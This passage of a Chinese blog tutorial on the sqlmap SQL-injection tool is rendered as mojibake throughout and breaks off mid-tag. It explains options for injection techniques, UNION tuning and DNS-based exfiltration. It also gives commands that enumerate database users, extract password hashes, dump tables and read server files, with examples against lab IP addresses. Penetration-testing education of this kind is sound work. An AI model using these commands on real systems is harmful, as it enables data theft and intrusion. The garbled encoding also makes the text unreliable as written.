æ­¤é€‰é¡¹éœ€è¦æŒ‡å®šè¦æ‰§è¡Œçš„æµ‹è¯•ç­‰çº§çš„å‚æ•°ã€‚æœ‰äº”ä¸ªå±‚æ¬¡ã€‚åœ¨æ‰§è¡Œæœ‰é™æ•°é‡çš„æµ‹è¯•(è¯·æ±‚)æ—¶ï¼Œé»˜è®¤å€¼ä¸º1ã€‚1~5æ¢æµ‹å¤æ‚é€æ­¥æå‡ã€‚</p><p>sqlmapä½¿ç”¨çš„æœ‰æ•ˆè´Ÿè½½åœ¨æ–‡æœ¬æ–‡ä»¶xml&#x2F;payload .xmlä¸­æŒ‡å®šã€‚æŒ‰ç…§æ–‡ä»¶é¡¶éƒ¨çš„è¯´æ˜ï¼Œå¦‚æœsqlmapé”™è¿‡äº†æ³¨å…¥ï¼Œæ‚¨ä¹Ÿåº”è¯¥èƒ½å¤Ÿæ·»åŠ è‡ªå·±çš„æœ‰æ•ˆè´Ÿè½½æ¥è¿›è¡Œæµ‹è¯•!</p><p>è¿™ä¸ªé€‰é¡¹ä¸ä»…ä¼šå½±å“åˆ°å“ªä¸ªæœ‰æ•ˆè´Ÿè½½sqlmapå°è¯•ï¼Œè¿˜ä¼šå½±å“åˆ°åœ¨è€ƒè¯•ä¸­å–å“ªä¸ªæ³¨å…¥ç‚¹:GETå’ŒPOSTå‚æ•°æ€»æ˜¯è¢«æµ‹è¯•ï¼ŒHTTP Cookieå¤´å€¼ä»ç¬¬2çº§æµ‹è¯•ï¼ŒHTTPç”¨æˆ·ä»£ç†&#x2F;å¼•ç”¨å¤´å€¼ä»ç¬¬3çº§æµ‹è¯•ã€‚</p><p>æ€»ä¹‹ï¼Œæ£€æµ‹SQLæ³¨å…¥è¶Šå›°éš¾ï¼Œå¿…é¡»è®¾ç½®çš„â€”â€”çº§åˆ«å°±è¶Šé«˜ã€‚ åœ¨æ˜¾ç¤ºæ— æ³•æ³¨å…¥æ—¶ï¼Œå¯ä»¥è®¾ç½® â€“level 5 æ¥è¿›è¡Œæ›´å¼ºå¤§çš„æ¢æµ‹</p><h3 id="7-2-è®¾ç½®é£é™©å‚æ•°"><a href="#7-2-è®¾ç½®é£é™©å‚æ•°" class="headerlink" title="7.2 è®¾ç½®é£é™©å‚æ•°"></a>7.2 è®¾ç½®é£é™©å‚æ•°</h3><p>æ­¤é€‰é¡¹éœ€è¦æŒ‡å®šè¦æ‰§è¡Œæµ‹è¯•çš„é£é™©çš„å‚æ•°ã€‚æœ‰ä¸‰ä¸ªé£é™©å€¼ã€‚é»˜è®¤å€¼ä¸º1ï¼Œè¿™å¯¹äºå¤§å¤šæ•°SQLæ³¨å…¥ç‚¹æ¥è¯´æ˜¯æ— å®³çš„ã€‚é£é™©å€¼2å¢åŠ äº†å¤§é‡åŸºäºæŸ¥è¯¢æ—¶é—´çš„SQLæ³¨å…¥æµ‹è¯•çš„é»˜è®¤çº§åˆ«ï¼Œå€¼3ä¹Ÿå¢åŠ äº†åŸºäºorçš„SQLæ³¨å…¥æµ‹è¯•ã€‚</p><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ¯”å¦‚UPDATEè¯­å¥ä¸­çš„SQLæ³¨å…¥ï¼Œæ³¨å…¥åŸºäºorçš„æœ‰æ•ˆè´Ÿè½½å¯èƒ½å¯¼è‡´è¡¨çš„æ‰€æœ‰æ¡ç›®çš„æ›´æ–°ï¼Œè¿™è‚¯å®šä¸æ˜¯æ”»å‡»è€…æƒ³è¦çš„ã€‚å‡ºäºè¿™ä¸ªåŸå› å’Œå…¶ä»–åŸå› ï¼Œæˆ‘ä»¬å¼•å…¥äº†è¿™ä¸ªé€‰é¡¹:ç”¨æˆ·å¯ä»¥æ§åˆ¶æµ‹è¯•çš„æœ‰æ•ˆè´Ÿè½½ï¼Œç”¨æˆ·å¯ä»¥ä»»æ„é€‰æ‹©ä½¿ç”¨ä¹Ÿæœ‰æ½œåœ¨å±é™©çš„è´Ÿè½½ã€‚</p><p>ä¾‹å¦‚ï¼š â€“risk num numèŒƒå›´ 1~3</p><h3 id="7-3-è®¾ç½®é¡µé¢æ¯”è¾ƒå‚æ•°"><a href="#7-3-è®¾ç½®é¡µé¢æ¯”è¾ƒå‚æ•°" class="headerlink" title="7.3 è®¾ç½®é¡µé¢æ¯”è¾ƒå‚æ•°"></a>7.3 è®¾ç½®é¡µé¢æ¯”è¾ƒå‚æ•°</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œé€šè¿‡æ¯”è¾ƒæ³¨å…¥çš„è¯·æ±‚é¡µé¢å†…å®¹å’Œæœªæ³¨å…¥çš„åŸå§‹é¡µé¢å†…å®¹ï¼Œå¯ä»¥åŒºåˆ†çœŸæŸ¥è¯¢å’Œå‡æŸ¥è¯¢ã€‚è¿™ç§è§‚å¿µå¹¶ä¸æ€»æ˜¯èµ·ä½œç”¨æ˜¯å› ä¸ºåœ¨æ¯æ¬¡åˆ·æ–°é¡µé¢å†…å®¹çš„å˜åŒ–æœ‰æ—¶ç”šè‡³æ²¡æœ‰æ³¨å°„,ä¾‹å¦‚å½“é¡µé¢æœ‰ä¸€ä¸ªè®¡æ•°å™¨,ä¸€ä¸ªåŠ¨æ€å¹¿å‘Šæ¨ªå¹…æˆ–ä»»ä½•å…¶ä»–HTMLçš„ä¸€éƒ¨åˆ†å‘ˆç°åŠ¨æ€å’Œå¯èƒ½æ”¹å˜æ—¶é—´ä¸ä»…å› æ­¤ç”¨æˆ·çš„è¾“å…¥ã€‚ä¸ºäº†ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼ŒsqlmapåŠªåŠ›è¯†åˆ«å“åº”ä½“çš„è¿™äº›ç‰‡æ®µå¹¶è¿›è¡Œç›¸åº”å¤„ç†ã€‚</p><p>â€“stringï¼šæŒ‡å®šåŒ…å«å­—ç¬¦ä¸² æŸ¥è¯¢ä¸ºTrue â€“not-stringï¼šæŒ‡å®šåŒ…å«å­—ç¬¦ä¸² æŸ¥è¯¢ä¸ºFalse â€“regexpï¼šæŒ‡å®šé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å­—ç¬¦ä¸²,æŸ¥è¯¢ä¸ºTrue â€“codeï¼šæŒ‡å®šåŒ¹é…HTTPçŠ¶æ€å“åº”ç ï¼ŒæŸ¥è¯¢ä¸ºTrue</p><h3 id="7-4-è®¾ç½®å†…å®¹æ¯”è¾ƒå‚æ•°"><a href="#7-4-è®¾ç½®å†…å®¹æ¯”è¾ƒå‚æ•°" class="headerlink" title="7.4 è®¾ç½®å†…å®¹æ¯”è¾ƒå‚æ•°"></a>7.4 è®¾ç½®å†…å®¹æ¯”è¾ƒå‚æ•°</h3><p>â€“text-onlyï¼šè®¾ç½®é¡µé¢å†…å®¹ä¸­åŒ…å«æ–‡æœ¬ã€‚</p><p>ä¾‹å¦‚ï¼šâ€“text-only &#x3D; â€œWelcome for True and Forbidden for Falseâ€</p><p>â€“titlesï¼šè®¾ç½®é¡µé¢titleä¸­åŒ…å«æ–‡æœ¬ã€‚å‰æéœ€è¦çŸ¥é“å¦‚ä½•åŒºåˆ†æŸ¥è¯¢çš„çœŸä¸å‡ï¼Œæ ¹æ®è¿”å›å­—ç¬¦ä¸²å†…å®¹ä¸åŒã€‚ â€“titles&#x3D;â€Loginâ€</p><h2 id="0x08-sqlmap-æ³¨å…¥æŠ€æœ¯å‚æ•°"><a href="#0x08-sqlmap-æ³¨å…¥æŠ€æœ¯å‚æ•°" class="headerlink" title="0x08 sqlmap æ³¨å…¥æŠ€æœ¯å‚æ•°"></a>0x08 sqlmap æ³¨å…¥æŠ€æœ¯å‚æ•°</h2><h3 id="8-1-è®¾ç½®å…·ä½“-SQL-æ³¨å…¥æŠ€æœ¯"><a href="#8-1-è®¾ç½®å…·ä½“-SQL-æ³¨å…¥æŠ€æœ¯" class="headerlink" title="8.1 è®¾ç½®å…·ä½“ SQL æ³¨å…¥æŠ€æœ¯"></a>8.1 è®¾ç½®å…·ä½“ SQL æ³¨å…¥æŠ€æœ¯</h3><p>â€“technique å‚æ•°ç”¨æ¥è®¾ç½®å…·ä½“SQLæ³¨å…¥æŠ€æœ¯ã€‚ä»¥ä¸‹åˆ—å‡ºSqlmapæ”¯æŒçš„SQLæ³¨å…¥æŠ€æœ¯ã€‚</p><p>B: Boolean-based blind åŸºäºå¸ƒå°”çš„ç›²æ³¨ E: Error-based æŠ¥é”™æ³¨å…¥ U: Union query-based UnionæŸ¥è¯¢æ³¨å…¥ S: Stacked queries å †å æ³¨å…¥ T: Time-based blind åŸºäºæ—¶é—´çš„ç›²æ³¨ Q: Inline queries å†…è”æŸ¥è¯¢æ³¨å…¥</p><p>ä¾‹å¦‚ï¼šsqlmap -u â€œå­˜åœ¨æ³¨å…¥ç‚¹çš„URLâ€ â€“technique B â€“current-db åˆ©ç”¨åŸºäºå¸ƒå°”çš„ç›²æ³¨å¯¹æ³¨å…¥ç‚¹è¿›è¡ŒSQLæ³¨å…¥æ¢æµ‹</p><h3 id="8-2-è®¾ç½®æ—¶é—´ç›²æ³¨å»¶è¿Ÿæ—¶é—´"><a href="#8-2-è®¾ç½®æ—¶é—´ç›²æ³¨å»¶è¿Ÿæ—¶é—´" class="headerlink" title="8.2 è®¾ç½®æ—¶é—´ç›²æ³¨å»¶è¿Ÿæ—¶é—´"></a>8.2 è®¾ç½®æ—¶é—´ç›²æ³¨å»¶è¿Ÿæ—¶é—´</h3><p>åœ¨æµ‹è¯•åŸºäºæ—¶é—´çš„ç›²SQLæ³¨å…¥æ—¶ï¼Œå¯ä»¥è®¾ç½®ç§’æ¥å»¶è¿Ÿå“åº”ï¼Œæ–¹æ³•æ˜¯æä¾›â€“time-secé€‰é¡¹ï¼Œåé¢è·Ÿç€ä¸€ä¸ªæ•´æ•°ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒçš„å€¼è®¾ç½®ä¸º5ç§’ã€‚</p><p>ä¾‹å¦‚ï¼š sqlmap -u â€œå­˜åœ¨æ³¨å…¥ç‚¹çš„URLâ€ â€“time-sec 3 â€“current-db </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020200.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020601.png" alt="img"></p><h3 id="8-3-è®¾ç½®-UNION-å­—æ®µæ•°"><a href="#8-3-è®¾ç½®-UNION-å­—æ®µæ•°" class="headerlink" title="8.3 è®¾ç½® UNION å­—æ®µæ•°"></a>8.3 è®¾ç½® UNION å­—æ®µæ•°</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œsqlmapæµ‹è¯•ä½¿ç”¨1åˆ°10åˆ—çš„UNIONæŸ¥è¯¢SQLæ³¨å…¥æŠ€æœ¯ã€‚ä½†æ˜¯ï¼Œé€šè¿‡æä¾›æ›´é«˜â€“levelå€¼ï¼Œå¯ä»¥å°†æ­¤èŒƒå›´å¢åŠ åˆ°50åˆ—ã€‚</p><p>æ‚¨å¯ä»¥æ‰‹åŠ¨å‘Šè¯‰sqlmapä½¿ç”¨ç‰¹å®šèŒƒå›´çš„åˆ—æ¥æµ‹è¯•è¿™ç§ç±»å‹çš„SQLæ³¨å…¥ï¼Œæ–¹æ³•æ˜¯ä¸ºè¯¥å·¥å…·æä¾›é€‰â€“union-colsåè·Ÿä¸€ç³»åˆ—æ•´æ•°ã€‚ä¾‹å¦‚ï¼Œ12-16è¡¨ç¤ºä½¿ç”¨12åˆ°16ä¸ªåˆ—å¯¹UNIONæŸ¥è¯¢SQLæ³¨å…¥è¿›è¡Œæµ‹è¯•ã€‚</p><p>ä¾‹å¦‚ï¼šsqlmap -u â€œå­˜åœ¨æ³¨å…¥çš„URLâ€ â€“union-cols 12-18 â€“current-db</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023721.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020336.png" alt="img"></p><h3 id="8-4-è®¾ç½®-UNION-å­—ç¬¦"><a href="#8-4-è®¾ç½®-UNION-å­—ç¬¦" class="headerlink" title="8.4 è®¾ç½® UNION å­—ç¬¦"></a>8.4 è®¾ç½® UNION å­—ç¬¦</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œsqlmapæµ‹è¯•ä½¿ç”¨ç©ºå­—ç¬¦çš„è”åˆæŸ¥è¯¢SQLæ³¨å…¥æŠ€æœ¯ã€‚ä½†æ˜¯ï¼Œé€šè¿‡æä¾›æ›´é«˜çº§åˆ«çš„å€¼sqlmapï¼Œè¿˜å°†ä½¿ç”¨éšæœºæ•°æ‰§è¡Œæµ‹è¯•ï¼Œå› ä¸ºåœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒUNIONæŸ¥è¯¢æµ‹è¯•ä½¿ç”¨NULLä¼šå¤±è´¥ï¼Œè€Œä½¿ç”¨éšæœºæ•´æ•°åˆ™ä¼šæˆåŠŸã€‚</p><p>æ‚¨å¯ä»¥æ‰‹åŠ¨å‘Šè¯‰sqlmapä½¿ç”¨ç‰¹å®šå­—ç¬¦æµ‹è¯•è¿™ç§ç±»å‹çš„SQLæ³¨å…¥ï¼Œæ–¹æ³•æ˜¯ä½¿ç”¨å¸¦æœ‰æ‰€éœ€å­—ç¬¦å€¼çš„é€‰é¡¹â€“union-char(ä¾‹å¦‚â€“union-char 123)ã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023449.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023060.png" alt="img"></p><h3 id="8-5-è®¾ç½®-UNION-æŸ¥è¯¢è¡¨"><a href="#8-5-è®¾ç½®-UNION-æŸ¥è¯¢è¡¨" class="headerlink" title="8.5 è®¾ç½® UNION æŸ¥è¯¢è¡¨"></a>8.5 è®¾ç½® UNION æŸ¥è¯¢è¡¨</h3><p>æŸäº›æƒ…å†µä¸‹ï¼ŒSqlmapéœ€è¦è®¾å®šUnion æŸ¥è¯¢SQLæ³¨å…¥çš„å…·ä½“æ•°æ®è¡¨æ‰å¯ä»¥å¾—åˆ°æ•°æ®ã€‚ â€“union-from è¡¨å </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020332.png" alt="img"></p><h3 id="8-6-è®¾ç½®-DNS-éœ²å‡ºæ”»å‡»"><a href="#8-6-è®¾ç½®-DNS-éœ²å‡ºæ”»å‡»" class="headerlink" title="8.6 è®¾ç½® DNS éœ²å‡ºæ”»å‡»"></a>8.6 è®¾ç½® DNS éœ²å‡ºæ”»å‡»</h3><p>é’ˆå¯¹ç›®æ ‡ç½‘ç»œå¾ˆæœ‰å¯èƒ½å¯¹å¤–éƒ¨æµé‡è¿›è¡Œé™åˆ¶ï¼Œæˆ–è€…è®¾ç½®WAFã€‚</p><p>é€šè¿‡è®¾ç½®DNSæµé‡æ¥çªç ´é™åˆ¶ â€“dns-domain â€œdnsæœåŠ¡å™¨â€ éœ€è¦ç”¨æˆ·è‡ªèº«å…·æœ‰ä¸€ä¸ªå¼€æ”¾53ç«¯å£çš„DNSæœåŠ¡å™¨ï¼Œé€šè¿‡DNSæµé‡æ¥è·å¾—Webåº”ç”¨ç¨‹åºä¸­æ•°æ®å†…å®¹ã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020213.png" alt="img"></p><h3 id="8-7-è®¾ç½®äºŒæ¬¡æ³¨å…¥"><a href="#8-7-è®¾ç½®äºŒæ¬¡æ³¨å…¥" class="headerlink" title="8.7 è®¾ç½®äºŒæ¬¡æ³¨å…¥"></a>8.7 è®¾ç½®äºŒæ¬¡æ³¨å…¥</h3><p>Sqlmapä¸­å¯ä»¥è®¾ç½®äºŒæ¬¡æ³¨å…¥çš„ç»“æœé¡µé¢ã€‚ â€“second-url URL </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020417.png" alt="img"></p><h3 id="8-8-è¯†åˆ«æŒ‡çº¹"><a href="#8-8-è¯†åˆ«æŒ‡çº¹" class="headerlink" title="8.8 è¯†åˆ«æŒ‡çº¹"></a>8.8 è¯†åˆ«æŒ‡çº¹</h3><p>â€“fingerprint -f æ¢æµ‹ç›®æ ‡æŒ‡çº¹ä¿¡æ¯ã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023448.png" alt="img"></p><h2 id="0x09-sqlmap-æ£€ç´¢-DBMS-ä¿¡æ¯"><a href="#0x09-sqlmap-æ£€ç´¢-DBMS-ä¿¡æ¯" class="headerlink" title="0x09 sqlmap æ£€ç´¢ DBMS ä¿¡æ¯"></a>0x09 sqlmap æ£€ç´¢ DBMS ä¿¡æ¯</h2><h3 id="9-1-æ£€ç´¢-DBMS-Banner-ä¿¡æ¯"><a href="#9-1-æ£€ç´¢-DBMS-Banner-ä¿¡æ¯" class="headerlink" title="9.1 æ£€ç´¢ DBMS Banner ä¿¡æ¯"></a>9.1 æ£€ç´¢ DBMS Banner ä¿¡æ¯</h3><p>è·å–åç«¯æ•°æ®åº“Bannerä¿¡æ¯ã€‚ â€“banneræˆ–è€… -b </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023235.png" alt="img"></p><h3 id="9-2-æ£€ç´¢-DBMS-å½“å‰ç”¨æˆ·"><a href="#9-2-æ£€ç´¢-DBMS-å½“å‰ç”¨æˆ·" class="headerlink" title="9.2 æ£€ç´¢ DBMS å½“å‰ç”¨æˆ·"></a>9.2 æ£€ç´¢ DBMS å½“å‰ç”¨æˆ·</h3><p>è·å–DBMSå½“å‰ç”¨æˆ· â€“current-user </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020891.png" alt="img"></p><h3 id="9-3-æ£€ç´¢-DBMS-å½“å‰æ•°æ®åº“"><a href="#9-3-æ£€ç´¢-DBMS-å½“å‰æ•°æ®åº“" class="headerlink" title="9.3 æ£€ç´¢ DBMS å½“å‰æ•°æ®åº“"></a>9.3 æ£€ç´¢ DBMS å½“å‰æ•°æ®åº“</h3><p>è·å–å½“å‰æ•°æ®åº“åã€‚ â€“current-db </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024028.png" alt="img"></p><h3 id="9-4-æ£€ç´¢-DBMS-å½“å‰ä¸»æœºå"><a href="#9-4-æ£€ç´¢-DBMS-å½“å‰ä¸»æœºå" class="headerlink" title="9.4 æ£€ç´¢ DBMS å½“å‰ä¸»æœºå"></a>9.4 æ£€ç´¢ DBMS å½“å‰ä¸»æœºå</h3><p>â€“hostname </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020400.png" alt="img"></p><h2 id="0x0A-sqlmap-æšä¸¾-DBMS-ä¿¡æ¯"><a href="#0x0A-sqlmap-æšä¸¾-DBMS-ä¿¡æ¯" class="headerlink" title="0x0A sqlmap æšä¸¾ DBMS ä¿¡æ¯"></a>0x0A sqlmap æšä¸¾ DBMS ä¿¡æ¯</h2><h3 id="10-1-æ¢æµ‹å½“å‰ç”¨æˆ·-DBA"><a href="#10-1-æ¢æµ‹å½“å‰ç”¨æˆ·-DBA" class="headerlink" title="10.1 æ¢æµ‹å½“å‰ç”¨æˆ· DBA"></a>10.1 æ¢æµ‹å½“å‰ç”¨æˆ· DBA</h3><p>â€“is-dba æ¢æµ‹å½“å‰ç”¨æˆ·æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ã€‚</p><p>è‹¥è¿”å›Trueï¼Œåˆ™è¯´æ˜å½“å‰ç”¨æˆ·æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024791.png" alt="img"></p><h3 id="10-2-æšä¸¾-DBMS-ç”¨æˆ·"><a href="#10-2-æšä¸¾-DBMS-ç”¨æˆ·" class="headerlink" title="10.2 æšä¸¾ DBMS ç”¨æˆ·"></a>10.2 æšä¸¾ DBMS ç”¨æˆ·</h3><p>è·å–DBMSæ‰€æœ‰ç”¨æˆ· â€“users</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020245.png" alt="img"></p><h3 id="10-3-æšä¸¾-DBMS-ç”¨æˆ·å¯†ç "><a href="#10-3-æšä¸¾-DBMS-ç”¨æˆ·å¯†ç " class="headerlink" title="10.3 æšä¸¾ DBMS ç”¨æˆ·å¯†ç "></a>10.3 æšä¸¾ DBMS ç”¨æˆ·å¯†ç </h3><p>â€“password è·å–ç”¨æˆ·å¯†ç </p><h3 id="10-4-æšä¸¾-DBMS-æƒé™"><a href="#10-4-æšä¸¾-DBMS-æƒé™" class="headerlink" title="10.4 æšä¸¾ DBMS æƒé™"></a>10.4 æšä¸¾ DBMS æƒé™</h3><p>â€“privileges â€“role(è§’è‰²) </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024501.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024378.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020399.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020080.png" alt="img"></p><h3 id="10-5-æšä¸¾æ•°æ®åº“å"><a href="#10-5-æšä¸¾æ•°æ®åº“å" class="headerlink" title="10.5 æšä¸¾æ•°æ®åº“å"></a>10.5 æšä¸¾æ•°æ®åº“å</h3><p>â€“dbs åˆ—ä¸¾æ•°æ®åº“åç§° </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020994.png" alt="img"></p><h3 id="10-6-æšä¸¾æ•°æ®åº“è¡¨"><a href="#10-6-æšä¸¾æ•°æ®åº“è¡¨" class="headerlink" title="10.6 æšä¸¾æ•°æ®åº“è¡¨"></a>10.6 æšä¸¾æ•°æ®åº“è¡¨</h3><p>â€“tables æšä¸¾è¡¨å â€“&gt; æŒ‡å®šå…·ä½“æ•°æ®åº“ -D æ•°æ®åº“å â€“exclude-sysdbs åªåˆ—å‡ºç”¨æˆ·è‡ªå·±æ–°å»ºçš„æ•°æ®åº“å’Œè¡¨ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024510.png" alt="img"></p><p> ï¼ˆæ’é™¤DBMSç³»ç»Ÿæ•°æ®åº“ï¼Œå½“æšä¸¾è¡¨æ—¶ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024789.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024774.png" alt="img"></p><h3 id="10-7-æšä¸¾æ•°æ®åº“è¡¨çš„åˆ—å"><a href="#10-7-æšä¸¾æ•°æ®åº“è¡¨çš„åˆ—å" class="headerlink" title="10.7 æšä¸¾æ•°æ®åº“è¡¨çš„åˆ—å"></a>10.7 æšä¸¾æ•°æ®åº“è¡¨çš„åˆ—å</h3><p>â€“columns -DæŒ‡å®šæ•°æ®åº“ -TæŒ‡å®šæ•°æ®è¡¨ -CæŒ‡å®šå…·ä½“å­—æ®µ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020147.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024183.png" alt="img"></p><h3 id="10-8-æšä¸¾æ•°æ®å€¼"><a href="#10-8-æšä¸¾æ•°æ®å€¼" class="headerlink" title="10.8 æšä¸¾æ•°æ®å€¼"></a>10.8 æšä¸¾æ•°æ®å€¼</h3><p>â€“dump </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020572.png" alt="img"></p><h2 id="0x0B-sqlmap-æšä¸¾ä¿¡æ¯"><a href="#0x0B-sqlmap-æšä¸¾ä¿¡æ¯" class="headerlink" title="0x0B sqlmap æšä¸¾ä¿¡æ¯"></a>0x0B sqlmap æšä¸¾ä¿¡æ¯</h2><h3 id="11-1-æšä¸¾-schema-ä¿¡æ¯"><a href="#11-1-æšä¸¾-schema-ä¿¡æ¯" class="headerlink" title="11.1 æšä¸¾ schema ä¿¡æ¯"></a>11.1 æšä¸¾ schema ä¿¡æ¯</h3><p>ç”¨æˆ·å¯ä»¥ä½¿ç”¨æ­¤å¼€å…³â€“schemaæ£€ç´¢DBMSæ¨¡å¼ã€‚æ¨¡å¼åˆ—è¡¨å°†åŒ…å«æ‰€æœ‰æ•°æ®åº“ã€è¡¨å’Œåˆ—ï¼Œä»¥åŠå®ƒä»¬å„è‡ªçš„ç±»å‹ã€‚ä¸â€“exclude-sysdbç»“åˆä½¿ç”¨æ—¶ï¼Œåªä¼šæ£€ç´¢å’Œæ˜¾ç¤ºåŒ…å«éç³»ç»Ÿæ•°æ®åº“çš„æ¨¡å¼çš„ä¸€éƒ¨åˆ†ã€‚</p><p>python sqlmap.py -u â€œ<a href="http://192.168.48.130/sqlmap/mysql/get_int.php?id=1%E2%80%9D">http://192.168.48.130/sqlmap/mysql/get_int.php?id=1â€</a> â€“schemaâ€“batch â€“exclude-sysdbs </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020965.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024313.png" alt="img"></p><h3 id="11-2-æšä¸¾æ•°æ®è¡¨æ•°é‡"><a href="#11-2-æšä¸¾æ•°æ®è¡¨æ•°é‡" class="headerlink" title="11.2 æšä¸¾æ•°æ®è¡¨æ•°é‡"></a>11.2 æšä¸¾æ•°æ®è¡¨æ•°é‡</h3><p>å¦‚æœç”¨æˆ·åªæƒ³çŸ¥é“è¡¨ä¸­çš„æ¡ç›®æ•°ï¼Œåˆ™å¯ä»¥ä½¿ç”¨æ­¤å¼€å…³ã€‚ â€“count</p><p>python sqlmap.py -u â€œ<a href="http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1%E2%80%9D">http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1â€</a> â€“count -D testdb</p><h3 id="11-3-è·å–æ•°æ®ä¿¡æ¯"><a href="#11-3-è·å–æ•°æ®ä¿¡æ¯" class="headerlink" title="11.3 è·å–æ•°æ®ä¿¡æ¯"></a>11.3 è·å–æ•°æ®ä¿¡æ¯</h3><p>â€“start, â€“stop, â€“first, â€“last</p><p>â€“start 1 â€“stop3 è·å–ç¬¬äºŒå¼ åˆ°ç¬¬ä¸‰å¼ è¡¨çš„åå­— â€“stop 1 è·å–ç¬¬ä¸€å¼ è¡¨çš„åå­— â€“first 3 â€“last 5 è·å–ä»ç¬¬ä¸‰å‡ºå‘åˆ°ç¬¬äº”ä¸ªå­—ç¬¦</p><h3 id="11-4-è®¾ç½®æ¡ä»¶è·å–ä¿¡æ¯"><a href="#11-4-è®¾ç½®æ¡ä»¶è·å–ä¿¡æ¯" class="headerlink" title="11.4 è®¾ç½®æ¡ä»¶è·å–ä¿¡æ¯"></a>11.4 è®¾ç½®æ¡ä»¶è·å–ä¿¡æ¯</h3><p>â€“pivot-column&#x3D;id è®¾ç½®ç‹¬ä¸€æ— äºŒçš„åˆ— â€“where&#x3D;â€œid&gt;3â€ è®¾ç½®æ¡ä»¶ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020507.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020887.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020079.png" alt="img"></p><h3 id="11-5-æš´åŠ›æ¿€æ´»æˆåŠŸæ•™ç¨‹æ•°æ®"><a href="#11-5-æš´åŠ›æ¿€æ´»æˆåŠŸæ•™ç¨‹æ•°æ®" class="headerlink" title="11.5 æš´åŠ›æ¿€æ´»æˆåŠŸæ•™ç¨‹æ•°æ®"></a>11.5 æš´åŠ›æ¿€æ´»æˆåŠŸæ•™ç¨‹æ•°æ®</h3><p>ä½¿ç”¨åœºæ™¯ï¼šMysql&lt;5.0æ—¶ï¼ŒMysqlä¸­æ²¡æœ‰å…ƒæ•°æ®åº“ information_schemaã€‚ â€“common-tables æš´åŠ›æ¿€æ´»æˆåŠŸæ•™ç¨‹è¡¨å â€“common-columns æš´åŠ›æ¿€æ´»æˆåŠŸæ•™ç¨‹åˆ—å</p><h3 id="11-6-è¯»å–æ–‡ä»¶"><a href="#11-6-è¯»å–æ–‡ä»¶" class="headerlink" title="11.6 è¯»å–æ–‡ä»¶"></a>11.6 è¯»å–æ–‡ä»¶</h3><p>å‰æï¼šå·²çŸ¥ç›®æ ‡ä¸»æœºæ–‡ä»¶è·¯å¾„ â€“file-read è·¯å¾„ è¯»å–å¯¹åº”æ–‡ä»¶å†…å®¹ã€‚ æ³¨æ„ï¼šæ­¤å¤„è·¯å¾„ä¸ºç»å¯¹è·¯å¾„ã€‚ï¼ˆéœ€è¦ä½¿ç”¨&#x2F;&#x2F;,å…¶ä¸­ä¸€ä¸ª&#x2F;è¡¨ç¤ºè½¬ä¹‰ï¼‰ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024417.png" alt="img"></p><p><img 